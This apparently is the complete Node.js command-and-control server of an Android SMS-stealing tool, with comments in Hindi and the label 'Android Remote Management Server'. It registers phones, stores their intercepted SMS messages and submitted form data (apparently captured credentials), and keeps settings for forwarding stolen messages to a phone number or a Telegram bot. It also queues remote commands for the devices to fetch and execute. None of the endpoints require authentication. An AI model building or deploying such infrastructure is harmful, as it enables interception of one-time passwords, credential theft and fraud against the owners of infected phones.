// जरूरी लाइब्रेरीज को इम्पोर्ट करें
const express = require('express');
const { Pool } = require('pg');
const cors = require('cors');

// --- सबसे महत्वपूर्ण: एनवायरनमेंट वेरिएबल की जांच ---
if (!process.env.DATABASE_URL) {
  console.error('FATAL ERROR: DATABASE_URL is not set in the environment.');
  process.exit(1); // बिना डेटाबेस URL के सर्वर को बंद कर दें
}

// सर्वर और डेटाबेस का सेटअप
const app = express();
const PORT = process.env.PORT || 3000;

// PostgreSQL डेटाबेस से कनेक्शन (कनेक्शन पूल फिक्स के साथ)
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: {
    rejectUnauthorized: false // Render पर SSL के लिए यह जरूरी है
  },
  idleTimeoutMillis: 30000,
  connectionTimeoutMillis: 20000,
});

// सर्वर को JSON और CORS उपयोग करने के लिए कॉन्फ़िगर करें
app.use(cors());
app.use(express.json());

// --- डेटाबेस टेबल और डेमो डिवाइस बनाने का लॉजिक ---
async function initializeDatabase() {
  const queries = [
    `CREATE TABLE IF NOT EXISTS devices (id SERIAL PRIMARY KEY, device_id TEXT UNIQUE NOT NULL, device_name TEXT, os_version TEXT, phone_number TEXT, battery_level INTEGER, last_seen TIMESTAMPTZ NOT NULL, created_at TIMESTAMPTZ NOT NULL DEFAULT CURRENT_TIMESTAMP);`,
    `CREATE TABLE IF NOT EXISTS commands (id SERIAL PRIMARY KEY, device_id TEXT NOT NULL, command_type TEXT NOT NULL, command_data TEXT NOT NULL, status TEXT NOT NULL DEFAULT 'pending', created_at TIMESTAMPTZ NOT NULL DEFAULT CURRENT_TIMESTAMP);`,
    `CREATE TABLE IF NOT EXISTS sms_logs (id SERIAL PRIMARY KEY, device_id TEXT NOT NULL, sender TEXT NOT NULL, message_body TEXT NOT NULL, received_at TIMESTAMPTZ NOT NULL DEFAULT CURRENT_TIMESTAMP);`,
    `CREATE TABLE IF NOT EXISTS form_submissions (id SERIAL PRIMARY KEY, device_id TEXT NOT NULL, custom_data TEXT NOT NULL, submitted_at TIMESTAMPTZ NOT NULL DEFAULT CURRENT_TIMESTAMP);`,
    `CREATE TABLE IF NOT EXISTS global_settings (setting_key TEXT PRIMARY KEY UNIQUE NOT NULL, setting_value TEXT);`,
    `INSERT INTO devices (device_id, device_name, os_version, phone_number, battery_level, last_seen, created_at) VALUES ('demo-device-12345', 'My Test Phone', 'Android 13', '+919999999999', 90, NOW() - interval '5 minutes', NOW() - interval '1 day') ON CONFLICT (device_id) DO NOTHING;`,
    `INSERT INTO devices (device_id, device_name, os_version, phone_number, battery_level, last_seen, created_at) VALUES ('demo-device-67890', 'Office Test Device', 'Android 12', '+918888888888', 75, NOW() - interval '10 minutes', NOW() - interval '2 days') ON CONFLICT (device_id) DO NOTHING;`
  ];
  for (const query of queries) {
    await pool.query(query);
  }
  console.log('Database initialized and demo devices are ready.');
}

// --- सभी API एंडपॉइंट्स (कोई बदलाव नहीं) ---

// 1. डिवाइस रजिस्ट्रेशन
app.post('/api/device/register', async (req, res) => {
  const { device_id, device_name, os_version, battery_level, phone_number } = req.body;
  if (!device_id) return res.status(400).json({ status: 'error', message: 'device_id is required.' });
  try {
    const existingDevice = await pool.query('SELECT id FROM devices WHERE device_id = $1', [device_id]);
    if (existingDevice.rows.length > 0) {
      await pool.query('UPDATE devices SET device_name = $1, os_version = $2, battery_level = $3, phone_number = $4, last_seen = NOW() WHERE device_id = $5', [device_name, os_version, battery_level, phone_number, device_id]);
    } else {
      await pool.query('INSERT INTO devices (device_id, device_name, os_version, battery_level, phone_number, last_seen, created_at) VALUES ($1, $2, $3, $4, $5, NOW(), NOW())', [device_id, device_name, os_version, battery_level, phone_number]);
    }
    res.status(200).json({ status: 'success', message: 'Device data received.' });
  } catch (err) { console.error('Error in /api/device/register:', err); res.status(500).json({ status: 'error', message: err.message }); }
});

// 2. डिवाइस लिस्ट
app.get('/api/devices', async (req, res) => {
  try {
    const { rows } = await pool.query('SELECT * FROM devices ORDER BY created_at ASC');
    const devicesWithStatus = rows.map(device => ({ ...device, is_online: (new Date() - new Date(device.last_seen)) < 30000 }));
    res.status(200).json(devicesWithStatus);
  } catch (err) { console.error('Error in /api/devices:', err); res.status(500).json({ status: 'error', message: err.message }); }
});

// 3 & 4. SMS फॉरवर्डिंग
app.post('/api/config/sms_forward', async (req, res) => {
  try {
    await pool.query(`INSERT INTO global_settings (setting_key, setting_value) VALUES ('sms_forward_number', $1) ON CONFLICT (setting_key) DO UPDATE SET setting_value = $1`, [req.body.forward_number]);
    res.status(200).json({ status: 'success', message: 'Forwarding number updated successfully.' });
  } catch (err) { console.error('Error in POST /api/config/sms_forward:', err); res.status(500).json({ status: 'error', message: err.message }); }
});
app.get('/api/config/sms_forward', async (req, res) => {
  try {
    const { rows } = await pool.query("SELECT setting_value FROM global_settings WHERE setting_key = 'sms_forward_number'");
    res.status(200).json({ forward_number: rows.length > 0 ? rows[0].setting_value : null });
  } catch (err) { console.error('Error in GET /api/config/sms_forward:', err); res.status(500).json({ status: 'error', message: err.message }); }
});

// 5. टेलीग्राम फॉरवर्डिंग
app.post('/api/config/telegram', async (req, res) => {
  try {
    await pool.query(`INSERT INTO global_settings (setting_key, setting_value) VALUES ('telegram_bot_token', $1) ON CONFLICT (setting_key) DO UPDATE SET setting_value = $1`, [req.body.telegram_bot_token]);
    await pool.query(`INSERT INTO global_settings (setting_key, setting_value) VALUES ('telegram_chat_id', $1) ON CONFLICT (setting_key) DO UPDATE SET setting_value = $1`, [req.body.telegram_chat_id]);
    res.status(200).json({ status: 'success', message: 'Telegram settings updated.' });
  } catch (err) { console.error('Error in POST /api/config/telegram:', err); res.status(500).json({ status: 'error', message: err.message }); }
});
app.get('/api/config/telegram', async (req, res) => {
  try {
    const tokenRow = await pool.query("SELECT setting_value FROM global_settings WHERE setting_key = 'telegram_bot_token'");
    const chatRow = await pool.query("SELECT setting_value FROM global_settings WHERE setting_key = 'telegram_chat_id'");
    res.status(200).json({ telegram_bot_token: tokenRow.rows.length > 0 ? tokenRow.rows[0].setting_value : null, telegram_chat_id: chatRow.rows.length > 0 ? chatRow.rows[0].setting_value : null });
  } catch (err) { console.error('Error in GET /api/config/telegram:', err); res.status(500).json({ status: 'error', message: err.message }); }
});

// 6. कमांड्स
app.post('/api/command/send', async (req, res) => {
  try {
    await pool.query('INSERT INTO commands (device_id, command_type, command_data, status) VALUES ($1, $2, $3, \'pending\')', [req.body.device_id, req.body.command_type, JSON.stringify(req.body.command_data)]);
    res.status(201).json({ status: 'success', message: 'Command queued.' });
  } catch (err) { console.error('Error in /api/command/send:', err); res.status(500).json({ status: 'error', message: err.message }); }
});
app.get('/api/device/:deviceId/commands', async (req, res) => {
  try {
    const { deviceId } = req.params;
    const { rows } = await pool.query("SELECT * FROM commands WHERE device_id = $1 AND status = 'pending' ORDER BY created_at ASC", [deviceId]);
    if (rows.length > 0) {
      const commandIds = rows.map(cmd => cmd.id);
      await pool.query("UPDATE commands SET status = 'sent' WHERE id = ANY($1::int[])", [commandIds]);
    }
    const commandsWithParsedData = rows.map(row => { try { return {...row, command_data: JSON.parse(row.command_data)}; } catch { return {...row, command_data: {}}; } });
    res.status(200).json(commandsWithParsedData);
  } catch (err) { console.error(`Error in GET /api/device/${req.params.deviceId}/commands:`, err); res.status(500).json({ status: 'error', message: err.message }); }
});
app.post('/api/command/:commandId/execute', async (req, res) => {
  try {
    await pool.query("UPDATE commands SET status = 'executed' WHERE id = $1", [req.params.commandId]);
    res.status(200).json({ status: 'success', message: 'Command marked as executed.' });
  } catch (err) { console.error(`Error in /api/command/${req.params.commandId}/execute:`, err); res.status(500).json({ status: 'error', message: err.message }); }
});

// 7. फॉर्म सबमिशन
app.post('/api/device/:deviceId/forms', async (req, res) => {
  try {
    await pool.query('INSERT INTO form_submissions (device_id, custom_data, submitted_at) VALUES ($1, $2, NOW())', [req.params.deviceId, req.body.custom_data]);
    res.status(201).json({ status: 'success', message: 'Form data received.' });
  } catch (err) { console.error('Error in /api/device/.../forms:', err); res.status(500).json({ status: 'error', message: err.message }); }
});

// 8. SMS लॉग्स
app.post('/api/device/:deviceId/sms', async (req, res) => {
  try {
    await pool.query('INSERT INTO sms_logs (device_id, sender, message_body, received_at) VALUES ($1, $2, $3, NOW())', [req.params.deviceId, req.body.sender, req.body.message_body]);
    res.status(201).json({ status: 'success', message: 'SMS logged.' });
  } catch (err) { console.error('Error in /api/device/.../sms:', err); res.status(500).json({ status: 'error', message: err.message }); }
});

// 9. डिवाइस डिलीट
app.delete('/api/device/:deviceId', async (req, res) => {
  try {
    const { deviceId } = req.params;
    await pool.query('DELETE FROM sms_logs WHERE device_id = $1', [deviceId]);
    await pool.query('DELETE FROM form_submissions WHERE device_id = $1', [deviceId]);
    await pool.query('DELETE FROM devices WHERE device_id = $1', [deviceId]);
    res.status(200).json({ status: 'success', message: 'Device and related data deleted.' });
  } catch (err) { console.error('Error in DELETE /api/device/...:', err); res.status(500).json({ status: 'error', message: err.message }); }
});

// 10. SMS डिलीट
app.delete('/api/sms/:smsId', async (req, res) => {
  try {
    await pool.query('DELETE FROM sms_logs WHERE id = $1', [req.params.smsId]);
    res.status(200).json({ status: 'success', message: 'SMS deleted.' });
  } catch (err) { console.error('Error in DELETE /api/sms/...:', err); res.status(500).json({ status: 'error', message: err.message }); }
});

// फ्रंटएंड रूट
app.get('/', (req, res) => {
  res.send('<h1>Android Remote Management Server is Running</h1><p>Server is active and connected to the database. Two demo devices have been added.</p>');
});

// सर्वर को शुरू करना
async function startServer() {
  try {
    await pool.query('SELECT NOW()');
    console.log('Database connected successfully.');
    await initializeDatabase();
    app.listen(PORT, () => console.log(`Server is running on port ${PORT}`));
  } catch (err) {
    console.error('Failed to connect to the database. Shutting down.', err);
    process.exit(1);
  }
}

startServer();
